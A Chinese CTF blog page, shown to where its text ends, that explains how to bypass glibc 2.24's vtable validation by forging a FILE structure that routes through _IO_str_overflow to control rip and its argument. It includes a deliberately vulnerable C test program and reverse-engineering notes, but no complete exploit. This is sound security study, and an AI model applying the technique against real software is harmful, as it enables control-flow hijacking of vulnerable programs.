@@ -1,0 +1,1102 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head>
+    <meta charset="utf-8">
+    <meta name="baidu-site-verification" content="RC70b8mZ9A" />
+    <meta name="msvalidate.01" content="325714A6172A8D425D843D8163893A54" />
+    <meta name="google-site-verification" content="QAmqP2zEYaSBqoZ9w1x5RdOflLW2Fir2-yVs5LTIUxA" />
+    <meta name="google-site-verification" content="QgUuEnRKG0PKdnDrOxnq55x7VxQbCiprrMJpfakMlow" />
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.0 -->
+    <script>
+        window.materialVersion = "1.5.0"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1'
+        ]
+    </script>
+
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+    <link rel="dns-prefetch" href="https://busuanzi.ibruce.info"/>
+
+
+
+        <link rel="dns-prefetch" href="https://cdn-city.livere.com"/>
+
+
+
+
+
+
+
+
+
+
+    <!-- Title -->
+    
+    <title>
+        
+            Pwn with File结构体（四） | 
+        
+        穷则变，变则通，通则久
+    </title>
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="theme-color" content="#0097A7">
+    <meta name="author" content="hac425">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content=",ctf,file struct">
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(window.oldVersion){var remove=window.oldVersion.reduce(function(p,c){return p||data.indexOf("/*"+c+"*/")!==-1},false);if(remove){lsloader.removeLS(key)}}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload,isJs){if(typeof cssonload==="boolean"){isJs=cssonload;cssonload=undefined}isJs=isJs||false;cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload,isJs);return}code=code.split(versionString)[1];if(isJs){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload,isJs)}};lsloader.requestResource=function(name,path,cssonload,isJs){var that=this;if(isJs){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else{this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/girl.png">
+    <link rel="icon" sizes="192x192" href="/img/girl.png">
+    <link rel="apple-touch-icon" href="/img/girl.png">
+
+    <!--iOS -->
+    <meta name="apple-mobile-web-app-title" content="Title">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="480">
+
+    <!-- Add to homescreen for Chrome on Android -->
+    <meta name="mobile-web-app-capable" content="yes">
+
+    <!-- Add to homescreen for Safari on iOS -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="穷则变，变则通，通则久">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icon -->
+
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?ezyEvm8ST5CGfpA+kFFi1g==", true)</script>
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://blog.hac425.top">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="Pwn with File结构体（四） | 穷则变，变则通，通则久">
+    <meta property="og:image" content="http://blog.hac425.top/img/girl.png" />
+    <meta property="og:description" content="">
+    <meta property="og:article:tag" content="ctf"> <meta property="og:article:tag" content="file struct"> 
+
+    
+        <meta property="article:published_time" content="Sat Jan 13 2018 22:25:00 GMT+0800" />
+        <meta property="article:modified_time" content="Wed Jan 17 2018 08:59:02 GMT+0800" />
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:title" content="Pwn with File结构体（四） | 穷则变，变则通，通则久">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:image" content="http://blog.hac425.top/img/girl.png">
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:url" content="http://blog.hac425.top" />
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://blog.hac425.top/2018/01/13/pwn_with_file_part4.html" />
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://blog.hac425.top/2018/01/13/pwn_with_file_part4.html",
+    "headline": "Pwn with File结构体（四）",
+    "datePublished": "Sat Jan 13 2018 22:25:00 GMT+0800",
+    "dateModified": "Wed Jan 17 2018 08:59:02 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "hac425",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/girl.png"
+        },
+        "description": "纵横捭阖，冷心为上"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "穷则变，变则通，通则久",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/girl.png"
+        }
+    },
+    "keywords": ",ctf,file struct",
+    "description": "",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+        <script>
+    var _hmt = _hmt || [];
+    (function() {var hm = document.createElement('script');
+    hm.src = 'https://hm.baidu.com/hm.js?99747687c69d73d9102f032f78f03e96';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#正文"><span class="post-toc-number">2.</span> <span class="post-toc-text">正文</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#最后"><span class="post-toc-number">3.</span> <span class="post-toc-text">最后</span></a></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                Pwn with File结构体（四）
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/girl.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>hac425</strong>
+        <span>1月 13, 2018</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACWklEQVR42u3aQU7DQAwF0N7/0rBFgrbf9uAE9LJCtM3MyyJjffvx8a+vBx4eHh4eHh4e3s14j/h6ervg094denvDw8PD2+G9edV++c4Pt/v2afWe+VrJffDw8PA2ec9euK8Bya+SF/1rXmEVPDw8vBvzqsdA78Hh4eHh/XVer9TOAfO94eHh4W3yJkFtL8i4XdaCh4eHF/PyJtP+36v9PTw8PLyAV72iBYoleB5qRDvEw8PD+2XepMw9FfgmoUPyKR4eHt4OL48A5rB87KB6FOHh4eHt86qv9cm4QNISS5pheHh4eFfx8gXyxaoR8CTALaTUeHh4eEd5yU2Tgjsaijo0aoCHh4d3FS/5QR4QJHFD3jbLIw88PDy8a3m9l35vmKA3svBmt3h4eHgrvOogaX5IFErhceMNDw8Pb5OXA06RquFvoRDHw8PDW+H1St68wZ+83HuPAA8PD2+fNxl4OtX+n5fveHh4ePu8/GDIG1fVODgPiN+U73h4eHgrvOowQT44lW+3Guk+XR0PDw9vhTcPAnpld/KA8qEBPDw8vE1e3u6qxrK96DYfgcXDw8O7lncqWk0i4Go5XjjA8PDw8FZ4vTZVwquW73loW06p8fDw8A7xqleviTUPGpJyHA8PD2+HVz0YJluvbrda3OPh4eFt8noBQX6QTMYUyg8ODw8Pb5F3NoCowvKD6jUSDw8P7868+VhAHkkUyn08PDy8P8WrtrV6j++ygwEPDw/v0CBUL4qdrLgU4+Lh4eEdaoDlzf5JwJH/Hw8PD2+f9/8uPDw8PDw8PDy8G1yf0tl3y0fQ9PcAAAAASUVORK5CYII=">
+    
+</ul>
+
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        <a class="post_tag-link" href="/tags/ctf/">ctf</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/file-struct/">file struct</a>
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Pwn with File结构体（四）&url=http://blog.hac425.top/2018/01/13/pwn_with_file_part4.html&pic=http://blog.hac425.top/img/girl.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Pwn with File结构体（四）&url=http://blog.hac425.top/2018/01/13/pwn_with_file_part4.html&via=hac425" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.hac425.top/2018/01/13/pwn_with_file_part4.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://blog.hac425.top/2018/01/13/pwn_with_file_part4.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面几篇文章说道，<code>glibc 2.24</code> 对 <code>vtable</code> 做了检测，导致我们不能通过伪造 <code>vtable</code> 来执行代码。今天逛 <code>twitter</code> 时看到了一篇通过绕过 对<code>vtable</code> 的检测 来执行代码的文章，本文做个记录。</p>
+<p>文中涉及的代码，libc, 二进制文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://gitee.com/hac425/blog_data/blob/master/pwn_file/file_struct_part4.rar</div></pre></td></tr></table></figure>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先还是编译一个有调试符号的 <code>glibc</code> 来辅助分析。</p>
+<p>源码下载链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://mirrors.ustc.edu.cn/gnu/libc/glibc-2.24.tar.bz2</div></pre></td></tr></table></figure></p>
+<p>可以参考<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://blog.csdn.net/mycwq/article/details/38557997</div></pre></td></tr></table></figure></p>
+<p>新建一个目录用于存放编译文件，进入该文件夹(这里为<code>glibc_224</code> )，执行 <code>configure</code> 配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">mkdir glibc_224</div><div class="line">cd glibc_224/</div><div class="line">../glibc-2.24/configure --prefix=/home/haclh/workplace/glibc_224  --disable-werror  --enable-debug=yes</div></pre></td></tr></table></figure></p>
+<p>然后 <code>make -j8 &amp;&amp; make install</code>, 即可在 <code>/home/haclh/workplace/glibc_224</code> 找到编译好的 <code>libc</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854267668556jyfkc.png?imageslim" alt="paste image"></p>
+<p>对 <code>vtable</code> 进行校验的函数是 <code>IO_validate_vtable</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854356776exse0i7d.png?imageslim" alt="paste image"><br>就是保证 <code>vtable</code>  要在 <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间。</p>
+<p>绕过的方法是在 <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间找到可以利用的东西，下面介绍两种。</p>
+<p>前提：可以伪造 <code>FILE</code> 机构体</p>
+<p>测试代码 ( <a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/" target="_blank" rel="external">来源</a> )<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/* gcc vuln.c -o vuln */</div><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">char fake_file[0x200];</div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">  FILE *fp;</div><div class="line">  puts(&quot;Leaking libc address of stdout:&quot;);</div><div class="line">  printf(&quot;%p\n&quot;, stdout); // Emulating libc leak</div><div class="line">  puts(&quot;Enter fake file structure&quot;);</div><div class="line">  read(0, fake_file, 0x200);</div><div class="line">  fp = (FILE *)&amp;fake_file;</div><div class="line">  fclose(fp);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>首先  <code>printf(&quot;%p\n&quot;, stdout)</code> 用来泄露 <code>libc</code> 地址，然后使用 <code>read</code> 读入数据用来伪造 <code>FILE</code> 结构体， 最后调用 <code>fclose(fp)</code>.</p>
+<p><strong>利用__IO_str_overflow</strong></p>
+<p><code>__IO_str_overflow</code>是 <code>_IO_str_jumps</code> 的一个函数指针.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854803562nlpu56fi.png?imageslim" alt="paste image"></p>
+<p><code>_IO_str_jumps</code> 就位于  <code>__stop___libc_IO_vtables</code>  和 <code>__start___libc_IO_vtables</code>  之间 所以我们是可以通过 <code>IO_validate_vtable</code> 的检测的。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515854871422xc7w9jfz.png?imageslim" alt="paste image"><br>具体怎么拿 <code>shell</code> 还得看看 <code>__IO_str_overflow</code> 的 <a href="https://code.woboq.org/userspace/glibc/libio/strops.c.html#_IO_str_overflow" target="_blank" rel="external">源代码</a>, 这里我就用 <code>ida</code> 看了（清楚一些）</p>
+<p>首先是对 <code>fp-&gt;_flag</code> 做了一些判断</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855084706pnihsyv9.png?imageslim" alt="paste image"><br>将 <code>fp-&gt;_flag</code> 设为 <code>0x0</code>, 就不会进入。接下来的才是重点</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855153693f1zfksay.png?imageslim" alt="paste image"></p>
+<p>可以看到 如果 设置 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt; fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</div></pre></td></tr></table></figure>
+<p>我们就能进入 <code>(fp[1]._IO_read_ptr)(2 * size + 100)</code>, 回到汇编看看。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1515855325659c257jd86.png?imageslim" alt="paste image"></p>
+<p>执行 <code>call    qword ptr [fp+0E0h]</code>， <code>fp+0E0h</code> 使我们控制的，于是可以控制 <code>rip</code>, 此时的参数为 <code>2 * size + 100</code>, 而 <code>size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code> 所以此次 <code>call</code> 的参数也是可以控制的。</p>
